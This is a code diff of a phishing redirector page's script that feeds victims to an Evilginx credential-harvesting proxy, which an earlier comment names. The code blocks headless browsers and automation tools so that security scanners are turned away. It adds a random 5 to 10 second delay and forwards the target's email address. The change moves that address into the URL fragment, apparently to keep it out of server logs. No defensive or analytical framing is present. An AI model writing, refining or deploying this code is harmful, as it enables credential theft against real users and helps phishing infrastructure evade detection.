@@ -24,23 +24,20 @@
 <script>
 window.addEventListener('load', function() {
   const botCheck = document.getElementById('bot-check');
-  
+
   // --- Headless / bot detection ---
   if (navigator.webdriver || /HeadlessChrome|PhantomJS|selenium/i.test(navigator.userAgent)) {
     console.warn("Bot detected; redirect blocked");
     return;
   }
 
+  const hash = window.location.hash; // "#target@example.com"
+
   if (botCheck && botCheck.value === 'no-bot') {
-    const urlParams = new URLSearchParams(window.location.search);
-    const email = urlParams.get('e');
-
-    // Random delay between 5–10 seconds
-    const delay = Math.floor(Math.random() * (10000 - 5000 + 1)) + 5000;
-
+    const delay = Math.floor(Math.random() * (10000 - 5000 + 1)) + 5000; // 5–10s
     setTimeout(function() {
-      // Forward email to final page (Evilginx)
-      window.location.href = 'timeout.html' + (email ? '?e=' + encodeURIComponent(email) : '');
+      // Forward hash to Page 3
+      window.location.href = 'timeout.html' + (hash || '');
     }, delay);
   } else {
     console.log('Bot detected or hidden input changed; redirect blocked.');
@@ -49,4 +46,5 @@ window.addEventListener('load', function() {
 </script>
 
 </body>
+
 </html>
